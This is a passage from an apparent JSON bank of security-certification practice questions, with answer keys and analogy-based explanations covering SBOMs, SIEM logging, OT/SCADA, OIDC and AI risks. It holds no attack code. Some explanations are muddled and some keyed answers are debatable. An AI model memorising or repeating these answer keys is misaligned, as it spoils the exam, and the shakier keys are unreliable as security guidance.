toe.","choose":1,"pbq":false,"exhibits":[]},{"id":379,"domain":1,"stem":"A company needs to quickly assess whether software deployed across the company's global corporate network contains specific software libraries. Which of the following best enables the company's SOC to respond quickly when such an assessment is required?","options":{"A":"Maintaining SAST/DAST reports on a server with access restricted to SOC staff","B":"Contractually requiring all software vendors to attest to third-party risk mitigations","C":"Requiring all suppliers and internal developers to implement a thorough SBoM","D":"Implementing a GRC tool to maintain a list of all software vendors and internal developers"},"answer":"C","explanation":"To answer 'does our global estate contain library X' tonight, you need an ingredients list for every product. That list is an SBOM, required of vendors and internal teams.\n\nSAST reports are snapshots of scans. A vendor spreadsheet is names, not libraries.\n\nImagine being able to search every frozen dinner in the warehouse for one recalled spice because each box has a label.","choose":1,"pbq":false,"exhibits":[]},{"id":380,"domain":4,"stem":"A malware analyst must examine the following partial file sample recovered from a Linux workstation: Attempts to run the code in a sandbox produce no results. Which of the following should the malware analyst do next to further analyze the malware and discover useful IoCs?","options":{"A":"Convert the hex-encoded sample to binary and attempt to decompile it.","B":"Run the encoded sample through an online vulnerability tool and check for any matches.","C":"Pad the beginning and end of the sample with binary executables and attempt to execute it.","D":"Use a disassembler on the unencoded snippet to convert from binary to ASCII text."},"answer":"A","explanation":"The sample is hex text and the sandbox shrugs. Convert it back to a binary and decompile or disassemble so strings and calls become IoCs.\n\nImagine a ransom note written in numbered code; you translate the numbers back into letters before you look for fingerprints.","choose":1,"pbq":false,"exhibits":["exhibits/q380_1.png"]},{"id":381,"domain":4,"stem":"During a recent security event, access from the non-production environment to the production environment enabled unauthorized users to install unapproved software and make unplanned configuration changes. During an investigation, the following findings are identified: • Several new users were added in bulk by the IAM team. • Additional firewall and routers were recently added to the network • Vulnerability assessments have been disabled for all devices for more than 30 days. • The application allow list has not been modified in more than two weeks. • Logs were unavailable for various types of traffic • Endpoints have not been patched in more than ten days. Which of the following actions would most likely need to be taken to ensure proper monitoring is in place within the organization? (Choose two.)","options":{"A":"Disable bulk user creations by the IAM team.","B":"Extend log retention for all security and network devices for 180 days for all traffic.","C":"Review the application allow list on a daily basis to make sure it is properly configured.","D":"Routinely update all endpoints and network devices as soon as new patches/hot fixes are available.","E":"Ensure all network and security devices are sending relevant data to the SIEM","F":"Configure rules on all firewalls to only allow traffic from the production environment to the non-production environment."},"answer":"B,E","explanation":"Non-prod reached prod and nobody had the full story. Keep security and network logs long enough, and make every new box send them to the SIEM, so the next review can actually reconstruct who did what.\n\nImagine requiring every new cash register to phone headquarters and keeping six months of tapes.","choose":2,"pbq":false,"exhibits":[]},{"id":382,"domain":2,"stem":"A security architect is performing threat-modeling activities related to an acquired overseas software company that will be integrated with existing products and systems. Once its software is integrated, the software company will process customer data for the acquiring company. Given the following: Which of the following mitigations would reduce the risk of the most significant threats?","options":{"A":"Privileged access management system with conditional access capabilities to prevent unauthorized access","B":"Rate-limiting capabilities on all authentication systems and leveraging single sign-on through federation","C":"Secure development process with gate checks and appropriate code scanning","D":"Zero Trust architecture for all assets from the acquired company using microsegmentation against sensitive applications"},"answer":"C","explanation":"An acquired overseas software shop will touch customer data. The loudest threats in that table are usually bad code and supply-chain defects. A secure SDLC with gates and scanning hits that.\n\nZero Trust helps after the code is in. It does not fix the factory.\n\nImagine inspecting how the new bakery bakes before you put their bread on your shelf.","choose":1,"pbq":false,"exhibits":["exhibits/q382_1.png"]},{"id":383,"domain":4,"stem":"An organization purchased a new manufacturing facility and the security administrator needs to: • Implement security monitoring. • Protect any non-traditional device(s)/network(s). • Ensure no downtime for critical systems. Which of the following strategies best meets these requirements?","options":{"A":"Configuring honeypots in the internal network to capture malicious activity","B":"Analyzing system behavior and responding to any increase in activity","C":"Applying updates and patches soon after they have been released","D":"Observing the environment and proactively addressing any malicious activity"},"answer":"D","explanation":"New plant gear cannot take noisy scans or surprise patches. Watch the environment, learn normal, and only then act on real malice so pumps stay up.\n\nImagine a night nurse who learns each patient’s baseline heartbeat before she calls a code.","choose":1,"pbq":false,"exhibits":[]},{"id":384,"domain":4,"stem":"Engineers are unable to control pumps at Site A from Site В when the SCADA controller at Site A experiences an outage. A security analyst must provide a secure solution that ensures Site A pumps can be controlled by a SCADA controller at Site В if a similar outage occurs again. Which of the following represents the most cost-effective solution?","options":{"A":"Procure direct fiber connectivity between Site A and Site В and limit its use to the critical SCADA controller traffic only.","B":"Install backup SCADA controllers at each site, isolate them from the ОТ network, and assign these backup controllers as high-availability pairs.","C":"Isolate the ОТ environment by providing an air-gapped network segment. Place the SCADA controller for each site in this network segment to minimize outages.","D":"Configure VPN concentrators inside the ОТ network segments at Site A and Site В and allow the controllers to act as secondary devices for the other site's pumps across this encrypted tunnel."},"answer":"D","explanation":"Site B must drive Site A’s pumps if A’s controller dies. A VPN between the two OT segments plus each controller as the other’s backup is cheaper than new fiber or a pile of spare hardware.\n\nImagine two water towers that can share a locked radio link so one crew can run both pumps in an emergency.","choose":1,"pbq":false,"exhibits":[]},{"id":385,"domain":3,"stem":"As part of a new software development method, a program manager requires that unit tests be written for all code before being promoted to production. The program manager wants to ensure that requirements can be tested and approved. Any security concerns should also be addressed prior to code deployment. Which of the following is an additional benefit of this new requirement?","options":{"A":"Dynamic analysis","B":"Integration testing","C":"Software composition analysis","D":"Input fuzzing"},"answer":"B","explanation":"Unit tests prove each function. Integration tests prove those functions still work — and stay safe — when they are wired together before promotion.\n\nImagine checking that the stove, the fridge, and the fire alarm still behave after you install them in the same kitchen.","choose":1,"pbq":false,"exhibits":[]},{"id":386,"domain":3,"stem":"A security engineer must implement controls to limit access between developer endpoints and a cloud provider bucket for data storage. Developers routinely save sensitive files to the bucket as part of their projects. The security engineer must reduce the risk of unintended data exposure. Which of the following is the most appropriate control to implement?","options":{"A":"Require server-side encryption using a KMS in the cloud provider.","B":"Implement context-aware reauthentication to the local system.","C":"Deploy an ACL on the virtual private cloud to avoid public access.","D":"Restrict HTTP POST and PUT traffic to specific URLs at the proxy."},"answer":"C","explanation":"Developers drop files in a cloud bucket that must not be public. A VPC/bucket ACL that denies public access is the direct lid; encryption alone still leaves a public URL readable to anyone with the link.\n\nImagine a storage unit whose hallway door is locked so passers-by cannot even see the boxes, not only padlocking each box.","choose":1,"pbq":false,"exhibits":[]},{"id":387,"domain":1,"stem":"A systems administrator decides to take a programmatic approach in cataloging system resiliency to both new and existing attack patterns. Which of the following should the systems administrator use?","options":{"A":"OWASP","B":"ATT&CK","C":"STRIDE","D":"CAPEC"},"answer":"B","explanation":"Cataloging resilience against new and old attack patterns in a programmatic way uses ATT&CK as the pattern list you score against.\n\nSTRIDE is design. OWASP is web. CAPEC is a pattern encyclopedia without the same operational scoring habit.\n\nImagine a checklist of burglar moves you tick after each control change.","choose":1,"pbq":false,"exhibits":[]},{"id":388,"domain":4,"stem":"A security engineer is reviewing logs and summarizes the following: • The target host communicates to an external IP address over HTTPS. • The external IP address was not categorized as malicious. • The company has a deep packet inspection system that supports HTTPS traffic. • The attack uses a known command-and-control tool to beacon from an affected host. Which of the following techniques did the attacker most likely use?","options":{"A":"Redirection","B":"Custom BOF","C":"EDR evasion","D":"Steganography"},"answer":"C","explanation":"HTTPS to an unlisted IP, DPI sees nothing useful, and a known C2 still beacons. The implant is hiding from the EDR on the host — EDR evasion — not a picture-in-a-picture trick.\n\nImagine a thief who walks past the lobby camera in a uniform the badge system already trusts.","choose":1,"pbq":false,"exhibits":[]},{"id":389,"domain":3,"stem":"An engineer must configure signing and encryption support for internal corporate email services. The Chief Information Security Officer wants a solution that is capable of monitoring suspicious email behavior. Which of the following should the engineer configure or deploy first? (Choose two.)","options":{"A":"AAA/RADIUS server","B":"Third-party CSR signing authority","C":"TLS 1.3 support","D":"Smart card support","E":"Certificate templates","F":"Key escrow services"},"answer":"E,F","explanation":"Internal S/MIME needs templates that allow signing and encryption, and key escrow so the company can still read mail if a laptop dies or a user is investigated. Those two are the first PKI pieces.\n\nImagine cutting official letter seals for staff and keeping a spare seal in the company safe.","choose":2,"pbq":false,"exhibits":[]},{"id":390,"domain":2,"stem":"An organization recently hired a third party to audit the information security controls present in the environment. After reviewing the audit findings, the Chief Information Security Officer (CISO) approved the budget for an in-depth defense strategy for network security. Which of the following is the most likely reason the CISO approved the additional budget?","options":{"A":"Other departments had unused budget, which was transferred to IT security.","B":"Potential customers increasingly asked for security compliance reports.","C":"The previous network architecture contained controls that could be easily bypassed.","D":"The auditor reported a low score on the PCI OSS self-assessment questionnaire."},"answer":"C","explanation":"Budget for in-depth network defense after an audit usually means the old design was bypassable — one fence, easy to walk around.\n\nPCI questionnaires and leftover budget are other stories.\n\nImagine paying for a second fence because the inspector showed how they stepped around the first.","choose":1,"pbq":false,"exhibits":[]},{"id":391,"domain":2,"stem":"After a recent outage, a software engineering company performed an audit of its development processes. The audit findings include the following: • The use of local branches were not enforced for software development. • Two-person review was not required for merges with production pipelines. • There was a lack of pre-production pipelines and insufficient bake times between stages. Which of the following changes would best improve the company's practices?","options":{"A":"Regression testing","B":"Architecture and integration review","C":"Formal specification and verification","D":"Coding standards and linting"},"answer":"B","explanation":"No local branches, no two-person merge, no pre-prod bake: the process and wiring are wrong. Architecture and integration review is the change that resets those gates.\n\nLinting will not create a second reviewer.\n\nImagine rebuilding the assembly line so two people must sign before a car leaves, not just polishing the paint.","choose":1,"pbq":false,"exhibits":[]},{"id":392,"domain":1,"stem":"An organization determines existing business continuity practices are inadequate to support critical internal process dependencies during a contingency event. A compliance analyst wants the Chief Information Officer (CIO) to identify the level of residual risk that is acceptable to guide remediation activities. Which of the following does the CIO need to clarify?","options":{"A":"Mitigation","B":"Impact","C":"Likelihood","D":"Appetite"},"answer":"D","explanation":"Critical processes cannot survive the current continuity plan. The CIO must say how much leftover risk is acceptable after you improve it. That number is appetite.\n\nImpact and likelihood feed the math. Appetite is the stop line.\n\nImagine asking 'how many days of payroll delay will you live with' before you buy generators.","choose":1,"pbq":false,"exhibits":[]},{"id":393,"domain":1,"stem":"Which of the following includes best practices for validating perimeter firewall configurations?","options":{"A":"CIS controls","B":"MITRE ATT&CK","C":"NIST CSF","D":"ISO 27001"},"answer":"A","explanation":"Prescriptive, testable firewall checks live in CIS Controls and CIS Benchmarks.\n\nATT&CK is adversary techniques. NIST CSF is functions. ISO 27001 is an ISMS.\n\nImagine a model-specific inspection checklist for this make of lock, not a poster about 'be safe.'","choose":1,"pbq":false,"exhibits":[]},{"id":394,"domain":2,"stem":"A security architect is troubleshooting an issue with an OIDC implementation. The architect reviews the following configuration and errors: Error: Invalid authentication request code Which of the following is the most likely cause of the error?","options":{"A":"The redirect-url parameter is not in the allowed list of redirect hosts in the configuration.","B":"Introspection is not enabled within the OIDC code implementation.","C":"The encoding of the URL parameters on the proxy system is failing.","D":"The state parameter is being reused within the authentication challenge.","E":"OAuth 2.0 was unable to verify the lack of an interception attack."},"answer":"A","explanation":"OIDC error on invalid auth request plus a redirect URL almost always means that URL is not on the allow-list.\n\nReused state or encoding issues are other bugs.\n\nImagine a bouncer whose clipboard does not list this side door, so nobody gets in that way.","choose":1,"pbq":false,"exhibits":["exhibits/q394_1.png"]},{"id":395,"domain":3,"stem":"A security analyst must perform a security review on a static application. The application mostly contains publicly available open-source modules. The analyst reviews the following table: Which of the following mitigations would the security analyst most likely recommend?","options":{"A":"Installing a WAF to block cross-site scripting","B":"Configuring TLS for all web-client connections","C":"Transitioning to proprietary modules","D":"Updating vulnerable third-party source code"},"answer":"D","explanation":"The table is known CVEs in public modules. Update or replace those third-party versions; a WAF does not patch the library you still ship.\n\nImagine tossing the recalled spice jars and buying new ones, not just adding a sign in the dining room.","choose":1,"pbq":false,"exhibits":["exhibits/q395_1.png"]},{"id":396,"domain":4,"stem":"A company SIEM collects information about the log sources. Given the following report information: Which of the following actions should a security engineer take to enhance the security monitoring posture?","options":{"A":"Calibrate the timing on the log sources to enhance event correlation.","B":"Implement a centralized use case library to get alerts based on the type of log sources.","C":"Perform a non-reporting device assessment to collect missing log sources.","D":"Create a resiliency plan to prevent losing event logs from log sources."},"answer":"A","explanation":"SIEM rows from different boxes disagree on the clock, so the same attack looks like two events. Sync and calibrate time so correlation rules can fire.\n\nImagine three store cameras each set to a different hour; you cannot tell which clip is “first.”","choose":1,"pbq":false,"exhibits":["exhibits/q396_1.png"]},{"id":397,"domain":3,"stem":"Which of the following explains why an organization should carefully consider whether to use AI to automate processes that interact with healthcare data?","options":{"A":"The model may be susceptible to AI pipeline injections.","B":"The model may be susceptible to information disclosure.","C":"The model may be susceptible to social engineering.","D":"The model may be susceptible to model inversion."},"answer":"B","explanation":"A model that sees health data can echo it in an answer, a log, or a training leak. Information disclosure is the privacy reason to go slow on automating those processes.\n\nImagine an intern who overheard a diagnosis and then mentioned it at lunch.","choose":1,"pbq":false,"exhibits":[]},{"id":398,"domain":3,"stem":"A security engineer is troubleshooting an outage of a site-to-site VPN between New York City and Atlanta. The tunnel is configured with a pre-shared key on two VPN concentrators. The Atlanta site should be configured to always listen for connections from the New York City site. The security engineer issues the following command on both devices: show crypto ike2 sa detailed The devices return the following output: Which of the following actions should the security engineer take to resolve the issue?","options":{"A":"Modify cipher suites to use AES256-GCM.","B":"Contact the Atlanta site's staff to restart the VPN concentrator.","C":"Add a third VPN concentrator.","D":"Configure the New York City site as the initiator."},"answer":"D","explanation":"Atlanta is set to listen; New York never starts the handshake. Make NYC the initiator so it dials Atlanta, which is already waiting.\n\nImagine one phone set to “answer only” and the other that never hits Call — flip the second phone to dial.","choose":1,"pbq":false,"exhibits":["exhibits/q398_1.png"]},{"id":399,"domain":3,"stem":"A government agency implements a configuration that disables cellular network access on government-issued devices while roaming internationally. The agency issues mobile hotspots and requires employees to use them for internet access. Which of the following best describes the agency's rationale?","options":{"A":"To protect against SIM hijack vulnerabilities","B":"To defend from carrier OTA attack vectors","C":"To block malicious radio connections","D":"To prevent attempts to downgrade the protocol to legacy 3G","E":"To filter directed electromagnetic interference"},"answer":"B","explanation":"Foreign cell networks can push over-the-air updates and intercept signaling. Hotspots on a network you control dodge those carrier OTA paths.\n\nImagine refusing to use a stranger’s hotel Wi-Fi and plugging into a travel router you brought instead.","choose":1,"pbq":false,"exhibits":[]},{"id":400,"domain":1,"stem":"A security manager at a local hospital wants to secure patient medical records. The manager needs to: • Choose an access control model that clearly defines who has access to sensitive information. • Prevent those who enter new patient information from specifying who has access to this data. Which of the following access control models is the best way to ensure the lowest risk of granting unintentional access?","options":{"A":"Rule-based","B":"Attribute-based","C":"Mandatory","D":"Discretionary"},"answer":"C","explanation":"Hospital records need a model where users do not choose who else can see a file they just typed. Discretionary access lets the creator share it.\n\nMandatory access control assigns labels (secret, confidential) and lets the system, not the clerk, decide.\n\nImagine folders that only open if your badge color matches the stamp on the folder. The clerk who filed the paper cannot hand a copy to a friend.","choose":1,"pbq":false,"exhibits":[]},{"id":401,"domain":4,"stem":"An organization recently experienced a security incident due to an exterior door in a busy area getting stuck open. The organization launches a security campaign focused on the motto. \"See Something. Say Something.\" Which of the following best describes what the organization wants to educate employees about?","options":{"A":"Situational awareness","B":"Phishing","C":"Social engineering","D":"Tailgating"},"answer":"A","explanation":"A stuck-open door in a crowd is fixed by people who notice and report it. That habit is situational awareness — see something, say something.\n\nImagine a store clerk who calls facilities when the emergency exit is propped with a brick.","choose":1,"pbq":false,"exhibits":[]},{"id":402,"domain":3,"stem":"After a leak of important documents, a company decides to implement a data protection program to avoid similar incidents in the future. Which of the following should the company do first?","options":{"A":"Implement data encryption.","B":"Perform data storage hardening.","C":"Deploy a data loss prevention policy.","D":"Develop data labeling standards."},"answer":"D","explanation":"You cannot protect data you have not named. Label classification first; encryption, hardening, and DLP rules all hang off those labels.\n\nImagine color-coding the folders before you buy the colored locks.","choose":1,"pbq":false,"exhibits":[]},{"id":403,"domain":1,"stem":"An organization is developing an in-house software platform to support capital planning and reporting functions. In addition to role-based access controls and auditing/logging capabilities, the product manager must include requirements associated with archiving data and immutable backups. Which of the following organizational considerations are most likely associated with this requirement? (Choose two.)","options":{"A":"Crypto-export management controls","B":"Supply chain weaknesses","C":"Device attestation","D":"Quality assurance","E":"Legal hold compliance","F":"Ransomware resilience"},"answer":"E,F","explanation":"Immutable archives for planning data are usually there for two reasons: a court can say 'do not delete this' (legal hold) and ransomware cannot encrypt the only copy (resilience).\n\nExport rules and QA are other programs.\n\nImagine a fireproof box that neither the thief nor the eager intern can rewrite.","choose":2,"pbq":false,"exhibits":[]},{"id":404,"domain":2,"stem":"A threat intelligence company's business objective is to allow customers to integrate data directly to different TIPs through an API. The company would like to address as many of the following objectives as possible: • Reduce compute spend as much as possible. • Ensure availability for all users. • Reduce the potential attack surface. • Ensure the integrity of the data provided. Which of the following should the company consider to best meet the objectives?","options":{"A":"Configuring a unique API secret key for accounts","B":"Publishing a list of IOCs on a public directory","C":"Implementing rate limiting for each registered user","D":"Providing a hash of all data that is made available"},"answer":"A","explanation":"Cheap, up, small surface, integrity for a TIP API: a unique API key per customer plus (in real designs) rate limits. The keyed best-of-list item they want here is unique keys so one leaked credential is not the whole farm.\n\nA public IOC directory grows the surface. A hash alone does not authorize.\n\nImagine a different spare key for each tenant instead of one master under the mat.","choose":1,"pbq":false,"exhibits":[]},{"id":405,"domain":3,"stem":"A company's Chief Information Security Officer learns that the senior leadership team is traveling to a country accused of attempting to steal intellectual property saved on laptops. Which of the following is the best method to protect against this attack?","options":{"A":"Configure Measured Boot to report any firmware changes.","B":"Use sanitized devices with remote connections to VDI.","C":"Deploy self-encrypting drives to protect company data.","D":"Install tamper-evident stickers over any laptop screws."},"answer":"B","explanation":"Hostile customs can image a laptop. Hand the traveler a clean thin client that only paints a VDI session; the files never leave home.\n\nImagine taking a blank notepad on the trip and phoning the office safe instead of packing the real contracts.","choose":1,"pbq":false,"exhibits":[]},{"id":406,"domain":4,"stem":"An organization would like to increase the effectiveness of its incident response process across its multiplatform environment. A security engineer needs to implement the improvements using the organization's existing incident response tools. Which of the following should the security engineer use?","options":{"A":"Playbooks","B":"Event collectors","C":"Centralized logging","D":"Endpoint detection"},"answer":"A","explanation":"Tools already exist; what is missing is a scripted, repeatable response on every platform. Playbooks (and SOAR that runs them) make IR consistent.\n\nImagine a laminated card at every register: if the drawer is short, do these five steps.","choose":1,"pbq":false,"exhibits":[]},{"id":407,"domain":1,"stem":"A company sells a security appliance assembled from globally sourced hardware and software components. Installing the security appliance requires enabling administrative permissions for the service accounts on the appliance. Which of the following allows the company to reassure new and existing customers that the risk introduced by the appliance is minimal?","options":{"A":"The results of a qualitative risk analysis performed on the appliance","B":"A business impact analysis and risk prioritization process","C":"Results of internal risk reduction studies conducted by a third-party assessor","D":"A transparent supply chain risk management and testing program"},"answer":"D","explanation":"Customers fear extra code in a box you assembled from the world. The reassurance is a visible program that tracks parts, tests them, and publishes that work.\n\nA private qualitative memo is not something a buyer can inspect.\n\nImagine a baby-crib maker who can show every bolt's factory and the drop-test video.","choose":1,"pbq":false,"exhibits":[]},{"id":408,"domain":2,"stem":"An organization is deploying a new data lake that will centralize records from several applications. During the design phase, the security architect identifies the following requirements: • The sensitivity levels of the data is different. • The data must be accessed through stateless API calls after authentication. • Different users will have access to different data sets. Which of the following should the architect implement to best meet these requirements?","options":{"A":"Directory services","B":"802.1X with EAP-TLS","C":"OpenID Connect","D":"CASB"},"answer":"C","explanation":"Different data sensitivity, stateless API after login, different people see different sets: OpenID Connect for the identity layer on those APIs.\n\n802.1X is a network port. CASB is SaaS.\n\nImagine a ticket that says who you are and what show you paid for, checked at every door, without keeping a chair in the lobby.","choose":1,"pbq":false,"exhibits":[]},{"id":409,"domain":1,"stem":"A penetration tester is drafting a report of findings and recommendations. Multiple EOL biomedical devices were compromised using a combination of known-exploit payloads for CVEs and VLAN hopping. The tester acknowledges that the systems cannot be changed or replaced in the hospital due to regulatory, safety, and cost reasons. Which of the following are the most effective controls for this scenario? (Choose two.)","options":{"A":"Deploying an IDS with active response for threat activities from a network tap","B":"Implementing QoS that limits the throughput of the link speeds from some VLANs","C":"Limiting trunking protocols to specific uplink ports of access switches","D":"Adding a proxy and requiring medical staff to authenticate every connection","E":"Inserting an in-line IPS between network segments of the affected hosts","F":"Performing security awareness training for these devices users"},"answer":"C,E","explanation":"EOL medical devices cannot leave the floor. Stop VLAN hopping by locking trunking to real uplinks, and put an in-line IPS between those devices and the rest of the hospital.\n\nImagine taping the extra door shut and posting a guard in the only hallway that remains.\n\nUser training does not patch a CVE on a locked-down pump.","choose":2,"pbq":false,"exhibits":[]},{"id":410,"domain":3,"stem":"A security engineer needs to secure the OT environment based on the following requirements: • Isolate the OT network segment. • Restrict internet access. • Apply security updates to workstations. • Provide remote access to third-party vendors. Which of the following design strategies should the engineer implement to best meet these requirements?","options":{"A":"Deploy a jump box on the third-party network to access the ОТ environment and provide updates using a physical delivery method on the workstations.","B":"Implement a bastion host in the ОТ network with security tools in place to monitor access and use a dedicated update server for the workstations.","C":"Enable outbound internet access on the ОТ firewall to any destination IP address and use the centralized update server for the workstations.","D":"Create a staging environment on the ОТ network for the third-party vendor to access and enable automatic updates on the workstations."},"answer":"B","explanation":"OT stays off the internet, vendors enter through a monitored bastion, and patches come from an internal update server. That meets isolate, restrict, update, and vendor access without opening outbound web.\n\nImagine a factory gatehouse: visitors sign in there, and spare parts arrive on a company truck, not a random van from the highway.","choose":1,"pbq":false,"exhibits":[]},{"id":411,"domain":2,"stem":"Which of the following best explains an AI model denial-of-service attack?","options":{"A":"Users posting large, computationally intensive data sets","B":"Untrustworthy and unverified model output","C":"An adversary attacking the API of an AI service","D":"Using the model output to understand its parameters or architecture"},"answer":"A","explanation":"AI model DoS here is users (or bots) stuffing huge, expensive prompts so the service chokes.\n\nStealing weights is inversion. Hitting the API is just 'an attack,' not this definition.\n\nImagine ordering a thousand twelve-course meals at once so the kitchen cannot plate anyone else.","choose":1,"pbq":false,"exhibits":[]},{"id":412,"domain":2,"stem":"A security architect is designing Zero Trust enforcement policies for all end users. The majority of users work remotely and travel frequently for work. Which of the following controls should the security architect do first?","options":{"A":"Switch user MFA from software-based tokens to hardware time-based OTPs.","B":"Implement TLS decryption and inspect inbound and outbound network traffic.","C":"Enforce daily posture compliance checks against the endpoint security controls.","D":"Deploy context-aware reauthentication with UBA baseline deviations."},"answer":"C","explanation":"Traveling remote users in Zero Trust: first, prove the laptop is still healthy every day (posture). Hardware tokens and TLS decrypt are later knobs.\n\nImagine not handing out a master key until today's inspection sticker is current.","choose":1,"pbq":false,"exhibits":[]},{"id":413,"domain":1,"stem":"Multiple users are continuously being prompted to use MFA to log in to their systems. The security team plans to implement policy changes that could address this type of issue for users without reducing the security of user accounts. Which of the following rule changes is the most secure?","options":{"A":"Creating a conditional access rule that does not require MFA upon login when the activity originates from the corporate network","B":"Creating a conditional access rule that does not require MFA when logging in with any user accounts, regardless of where the login occurs","C":"Creating a conditional access rule that requires MFA only when logging in to the company email provider","D":"Creating a conditional access rule that requires MFA upon all logins, but taking away some password complexity requirements"},"answer":"A","explanation":"Staff are MFA-prompted to death. The secure relief is to skip MFA only when the request already comes from the corporate network you control — not to drop MFA everywhere or weaken passwords.\n\nImagine a badge that still works at the lobby desk without a second code, but still needs the code from a café Wi-Fi.\n\nTurning MFA off for all accounts is the opposite of the goal.","choose":1,"pbq":false,"exhibits":[]},{"id":414,"domain":1,"stem":"A security analyst is performing threat modeling for a new AI chatbot. The AI chatbot will be rolled out to help customers develop configuration information within the company's SaaS offering. Which of the following issues would require involvement from the company's internal legal team?","options":{"A":"An internal user finds a way to use prompt injection to disregard guardrails.","B":"A DoS vulnerability exists that could impact all customers who use the chatbot.","C":"A bug bounty of an exploitable model inversion vulnerability is submitted.","D":"User consent is not being collected before training models on customer data.","E":"An access control issue is allowing the model to be poisoned with incorrect information."},"answer":"D","explanation":"Training a chatbot on customer data without consent is a legal and privacy issue. That is the item counsel owns.\n\nPrompt injection and model inversion are security bugs for engineering.\n\nImagine using a customer's private letters to teach a clerk, without asking the customer. Legal will want a word before security tunes the model.","choose":1,"pbq":false,"exhibits":[]},{"id":415,"domain":2,"stem":"A network security architect is working on capturing network traffic to support the following objectives in the pictured network: • Capture relevant traffic to share with a threat intelligence vendor. • Collect only traffic that could indicate a potential network intrusion. • Minimize the budget and resource requirements of the collected traffic. Which of the following is the best way for the network security architect to capture network traffic?","options":{"A":"Placing a network tap on the ISP router","B":"Configuring a span port on the core switch","C":"Deploying a transparent proxy on the firewall","D":"Connecting a network hub to the IDS device"},"answer":"B","explanation":"Need suspicious traffic only, cheap, to share with a vendor: a span on the core sees east-west and north-south without buying a tap on the ISP router that would also dump every byte to the internet.\n\nA hub on the IDS is noisy and old.\n\nImagine a side mirror on the main hallway camera, not a microphone on the street.","choose":1,"pbq":false,"exhibits":["exhibits/q415_1.png"]},{"id":416,"domain":4,"stem":"A security analyst is attempting to determine which user accessed an internal web server. The analyst obtains the following address assignment logs from the VPN and logs from the domain when authenticating for the VPN from the SIEM: Which of the following actions should the analyst take?","options":{"A":"Confirm that the workstation and hostnames are the same in both logs.","B":"Use the assigned VPN addresses for failed logins to identify the user.","C":"Ensure that all log sources are configured to the same time zone.","D":"Reduce the delay in VPN logs being sent to the SIEM."},"answer":"C","explanation":"VPN and directory logs disagree about who was on the web server because the clocks or time zones do not match. Align time first; then the IPs and names will line up.\n\nImagine two punch clocks, one on daylight time and one not — you cannot tell who was in the building at 5 p.m.","choose":1,"pbq":false,"exhibits":["exhibits/q416_1.png"]},{"id":417,"domain":1,"stem":"A company in a regulated industry experiences a data breach after an employee clicks on an email phishing link and enters credentials, leading to the exposure of sensitive information. Which of the following should the company do to prevent future attacks? (Choose two.)","options":{"A":"Deploy a NAC.","B":"Implement deep packet inspection.","C":"Establish password complexity requirements.","D":"Implement a WAF.","E":"Enforce multifactor authentication.","F":"Create a security awareness training program."},"answer":"E,F","explanation":"The phish collected a password and opened sensitive data. Next time, MFA stops the password from being enough, and awareness training cuts the click rate.\n\nA WAF and NAC do not sit on that mailbox.\n\nImagine a second lock on the door plus a class on not handing keys to strangers at the curb.","choose":2,"pbq":false,"exhibits":[]},{"id":418,"domain":3,"stem":"Which of the following mechanisms must a security protocol provide in order for zero-knowledge proofs to work in practical cryptographic applications?","options":{"A":"Challenge-response series","B":"Shared secret key derivation","C":"Multiparty value splitting","D":"Three-way handshake"},"answer":"A","explanation":"A practical zero-knowledge proof is a challenge-response dance: the verifier asks a question only someone with the secret can answer, without the secret being sent.\n\nImagine proving you know the locker combo by opening it while the other person watches, then spinning the dial — they never learn the numbers.","choose":1,"pbq":false,"exhibits":[]},{"id":419,"domain":2,"stem":"A global company has data centers on multiple continents. The company suffers a breach due to a poorly secured, publicly available web server. The attacker pivots from the web server to several other enterprise servers. Which of the following would be the best way to prevent an attacker from accessing multiple enterprise servers from this single web server?","options":{"A":"Context-based authentication","B":"Screened subnet","C":"Microsegmentation","D":"Edge firewall"},"answer":"C","explanation":"A public web box became a hop to other enterprise servers. Microsegmentation stops that hop.\n\nAn edge firewall already missed it. A screened subnet helps north-south, not every east-west step.\n\nImagine fire doors so a fire in the lobby shop cannot walk into the offices.","choose":1,"pbq":false,"exhibits":[]},{"id":420,"domain":1,"stem":"A systems administrator works for an organization that is merging with another one. The systems administrator needs to produce specific reports for the board of directors. Which of the following actions is the board of directors most likely taking?","options":{"A":"Exercising due diligence","B":"Enforcing a non-disclosure agreement","C":"Investigating their right of first refusal","D":"Performing third-party attestations"},"answer":"A","explanation":"A board asking for merger reports is doing due diligence: understand what you are buying before you sign.\n\nNDAs and attestations are other papers.\n\nImagine reading the inspection report before you buy the house.","choose":1,"pbq":false,"exhibits":[]},{"id":421,"domain":3,"stem":"An engineer sees the following segment while manually integrating legacy code into a modern application: Which of the following functions or expressions should the engineer modify?","options":{"A":"Line [03]; String destination[len];","B":"Line [03]; char source[20];","C":"Line [04]; if (sizeof(source) > 8)","D":"Line [04]; Remove if-else clause","E":"Line [05]; snprintf (...);","F":"Line [05]; memcpy(...);"},"answer":"E","explanation":"The dangerous call is the unbounded copy into a fixed buffer. snprintf (with a size) or a bounds-checked copy on that line stops the overflow the legacy snippet still has.\n\nImagine pouring a gallon of juice into an 8-ounce glass — use a funnel with a marked stop line.","choose":1,"pbq":false,"exhibits":["exhibits/q421_1.png"]},{"id":422,"domain":1,"stem":"The security team at a hospital has proposed redesigning the lobby to change the orientation of employee monitors in order to prevent patients from seeing anything displayed onscreen. Which of the following concerns is team most likely trying to address?","options":{"A":"Situational awareness","B":"Social engineering","C":"Privacy","D":"Physical security"},"answer":"C","explanation":"Turning lobby monitors away from patients is so visitors cannot read names and charts. That is privacy (shoulder surfing), not a camera or a lock.\n\nImagine a pharmacist turning the screen when you walk up to the counter.","choose":1,"pbq":false,"exhibits":[]},{"id":423,"domain":1,"stem":"A Chief Information Security Officer receives the following findings from a third-party risk assessment report: Finding #1: Absence of a risk management process Finding #2: Absence of a formal information security management system Finding #3: Absence of formal procedures to review access Finding #4: Absence of management engagement on monitoring security objectives Which of the following is best for the security team to use when remediating the findings?","options":{"A":"Incorporate PCI DSS compliance.","B":"Implement ISO/IEC 27001 standard recommendation.","C":"Use OWASP to implement consistent security testing.","D":"Research appropriate CIS benchmarks and apply them."},"answer":"B","explanation":"No risk process, no ISMS, no access review, no management on objectives. That cluster is what ISO/IEC 27001 is built to stand up.\n\nPCI is card data. OWASP is app tests. CIS benchmarks are technical checklists.\n\nImagine adopting a whole school curriculum when the finding is 'there is no school,' not one extra quiz.","choose":1,"pbq":false,"exhibits":[]},{"id":424,"domain":2,"stem":"An organization has a hybrid architecture that requires disparate systems to communicate with one another without a common chain of trust. Which of the following is the best solution?","options":{"A":"Deploying a hierarchical access control model","B":"Enabling context-based authentication","C":"Using microsegmentation between servers","D":"Implementing remote attestation 